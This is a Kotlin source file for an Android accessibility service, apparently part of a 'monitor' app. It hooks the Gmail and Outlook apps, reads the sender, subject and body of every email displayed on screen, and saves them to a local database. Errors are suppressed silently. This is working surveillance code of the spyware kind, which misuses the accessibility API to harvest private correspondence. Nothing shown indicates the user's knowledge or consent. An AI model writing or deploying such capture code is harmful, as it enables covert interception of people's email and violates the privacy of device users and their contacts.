package com.empresa.monitor.service.email

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.empresa.monitor.data.db.MonitorDatabase
import com.empresa.monitor.data.db.entity.GmailEntity
import com.empresa.monitor.data.db.entity.OutlookEntity
import kotlinx.coroutines.*

/**
 * Captures Gmail and Outlook emails via Accessibility Service.
 * Monitors the Gmail and Outlook apps and captures email content
 * when emails are opened/displayed on screen.
 */
class EmailCaptureService : AccessibilityService() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val db by lazy { MonitorDatabase.getInstance(this) }

    private var activeApp: String? = null
    private var lastCaptureTime = 0L

    companion object {
        private const val MIN_CAPTURE_INTERVAL = 2000L // 2s between captures
        private const val GMAIL_PACKAGE = "com.google.android.gm"
        private const val OUTLOOK_PACKAGE = "com.microsoft.office.outlook"
        private const val GMAIL_LEGACY = "com.google.android.gm"
        private const val INBOX_PACKAGE = "com.google.android.apps.inbox"
    }

    private var instance: EmailCaptureService? = null
    fun getInstance() = instance

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val packageName = event.packageName?.toString() ?: return

                when {
                    packageName == GMAIL_PACKAGE -> {
                        activeApp = "gmail"
                        delayAndCapture()
                    }
                    packageName == OUTLOOK_PACKAGE -> {
                        activeApp = "outlook"
                        delayAndCapture()
                    }
                    else -> {
                        if (activeApp != null) {
                            activeApp = null
                        }
                    }
                }
            }

            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                if (activeApp != null) {
                    val now = System.currentTimeMillis()
                    if (now - lastCaptureTime > MIN_CAPTURE_INTERVAL * 3) {
                        delayAndCapture()
                    }
                }
            }

            AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                // User is scrolling through email - capture if in Gmail/Outlook
                if (activeApp != null) {
                    delayAndCapture()
                }
            }
        }
    }

    private fun delayAndCapture() {
        scope.launch {
            delay(1500) // Wait for content to fully render
            captureEmailContent()
        }
    }

    private suspend fun captureEmailContent() {
        if (System.currentTimeMillis() - lastCaptureTime < MIN_CAPTURE_INTERVAL) return

        val root = rootInActiveWindow ?: return
        val app = activeApp ?: return
        lastCaptureTime = System.currentTimeMillis()

        withContext(Dispatchers.IO) {
            when (app) {
                "gmail" -> captureGmail(root)
                "outlook" -> captureOutlook(root)
            }
        }
    }

    private suspend fun captureGmail(root: AccessibilityNodeInfo) {
        try {
            // Try to find email content in Gmail
            val subject = findTextInNode(root, "subject", "Subject", "Asunto")
            val sender = findTextInNode(root, "from", "From", "De:")
            val body = findLargeTextBlock(root)

            if (subject != null || body != null) {
                val email = GmailEntity(
                    sender = sender,
                    senderEmail = extractEmail(sender),
                    recipient = null,
                    subject = subject,
                    body = body?.take(5000), // limit body size
                    timestamp = System.currentTimeMillis(),
                    isRead = true
                )
                db.gmailDao().insert(email)
            }
        } catch (e: Exception) { /* silent */ }
    }

    private suspend fun captureOutlook(root: AccessibilityNodeInfo) {
        try {
            val subject = findTextInNode(root, "subject", "Subject", "Asunto")
            val sender = findTextInNode(root, "from", "From", "De:")
            val body = findLargeTextBlock(root)

            if (subject != null || body != null) {
                val email = OutlookEntity(
                    sender = sender,
                    senderEmail = extractEmail(sender),
                    recipient = null,
                    subject = subject,
                    body = body?.take(5000),
                    timestamp = System.currentTimeMillis(),
                    isRead = true
                )
                db.outlookDao().insert(email)
            }
        } catch (e: Exception) { /* silent */ }
    }

    private fun findTextInNode(node: AccessibilityNodeInfo, vararg labels: String): String? {
        if (node.text?.isNotEmpty() == true) {
            val text = node.text.toString()
            val contentDesc = node.contentDescription?.toString() ?: ""
            if (labels.any { text.contains(it, ignoreCase = true) || contentDesc.contains(it, ignoreCase = true) }) {
                // Try to find the sibling or next view with actual email text
                val parent = node.parent
                if (parent != null) {
                    for (i in 0 until parent.childCount) {
                        val child = parent.getChild(i)
                        if (child != node && child?.text?.isNotEmpty() == true) {
                            val result = child.text.toString()
                            child.recycle()
                            return result
                        }
                        child?.recycle()
                    }
                }
            }
        }

        // Search children
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                val result = findTextInNode(child, *labels)
                if (result != null) {
                    child.recycle()
                    return result
                }
                child.recycle()
            }
        }
        return null
    }

    private fun findLargeTextBlock(node: AccessibilityNodeInfo): String? {
        val text = node.text?.toString()
        if (text != null && text.length > 50) return text

        val contentDesc = node.contentDescription?.toString()
        if (contentDesc != null && contentDesc.length > 50) return contentDesc

        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                val result = findLargeTextBlock(child)
                if (result != null) {
                    child.recycle()
                    return result
                }
                child.recycle()
            }
        }
        return null
    }

    private fun extractEmail(text: String?): String? {
        if (text == null) return null
        val emailRegex = Regex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}")
        return emailRegex.find(text)?.value
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        instance = null
        scope.cancel()
        super.onDestroy()
    }
}
